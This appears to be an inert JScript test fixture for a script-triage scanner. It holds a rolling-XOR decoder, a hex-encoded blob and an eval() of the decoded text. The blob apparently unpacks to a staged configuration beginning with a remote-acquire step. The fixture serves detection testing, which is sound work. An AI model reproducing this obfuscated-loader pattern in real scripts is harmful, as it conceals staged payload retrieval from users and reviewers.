// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_8bdcb3c6 = function decode_8bdcb3c6_body(s) {
  var d = [];
  var previous = 111;
  for (var i = 0; i < s.length; i++) { d.push(s[i] ^ previous); previous = s[i]; }
  return d;
};
var recover_2b3d98d5 = function recover_2b3d98d5_body() {
  // configuration reconstruction
  var packedText = "14:36:45:31:54:24:57:75:4f:14:36:57:34:45:30:59:2b:4e:11:63:06:6b:04:70:15:37:1b:39:4e:3c:55:21:44:1b:7d:14:78:1d:3f:13:31:55:3c:4f:3f:5e:2a:49:21:7e:0e:7c:13:70:15:66:15:37:1b:39:51:30:5e:3a:55:33:55:0a:79:1a:68:01:71:05:27:7a:56:74:15:71:10:60:14:71:03:21:1b:39:6e:07:69:21:55:21:51:7f:28:41:2f:67:13:67:17:45:20:51:24:41:32:46:68:5d:73:42:60:4c:6e:18:79:15:60:05:76:54:6e:15:37:54:35:58:28:49:20:47:29:76:1f:7b:59:63:41:22:43:2e:5e:3f:56:31:5f:72:47:7e:18:7e:1d:7e:46:74:10:76:54:78:5a:2f:5d:31:13:29:0b:63:17:63:13:60:5a:75:5a:6f:56:30:56:35:56:6e:5c:38:5e:70:15:6d:0c:61:11:7d:18:36:5f:31:47:26:4a:23:47:68:5a:6e:0f:3b:58:3e:0a:33:1d:79:18:6c:4e:62:40:35:46:23:51:0e:6f:08:6d:03:77:55:6f:4d:05:70:1e:6a:18:7d:0e:7d:31:50:32:1d:28:11:77:11:72:11:29:1b:7f:19:3b:17:35:53:3a:56:33:6c:1c:7d:09:61:43:79:5b:18:22:7e:22:77:04:61:13:60:3c:60:30:45:27:4b:22:41:1d:41:09:7c:12:66:14:71:02:71:3d:5c:3e:62:3e:4d:39:58:3f:5a:77:42:7b:1d:7b:18:7b:43:71:15:73:5d:39:58:2c:0e:22:00:72:17:70:19:6a:1e:6c:15:4a:3a:5b:2f:47:65:5f:7d:35:7e:3d:68:34:68:3b:54:32:46:31:50:22:47:1b:47:0f:7a:14:60:12:77:04:77:3b:5a:38:64:38:7c:15:66:16:79:0a:6b:09:65:00:5c:00:35:0c:6a:0c:6f:0c:34:06:62:04:26:0a:28:46:23:5b:2f:70:03:77:16:71:14:36:0c:2e:5c:39:4a:25:50:22:41:24:09:7a:1b:76:06:6a:0f:21:51:22:13:31:4c:60:42:31:45:24:43:26:65:0a:7f:11:65:47:7d:49:34";
  var packedParts = packedText.split(":");
  var s = [];
  for (var hi = 0; hi < packedParts.length; hi++) { s.push(parseInt(packedParts[hi], 16)); }
  var n = [3, 5, 8, 13].slice(1, 3);
  var d = [];
  try { d = decode_8bdcb3c6(s); } catch (ignored) { d = []; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < d.length; bi++) { textParts.push(String.fromCharCode(d[bi])); }
  var t = textParts.join("");
  return t;
  // end reconstruction
};
var inspect_681be9be = function inspect_681be9be_body() {
  var o = eval("(" + recover_2b3d98d5() + ")");
  return { steps: o["steps"], adapter: o["adapter"], values: o["values"], stageCount: o["stageCount"] };
};
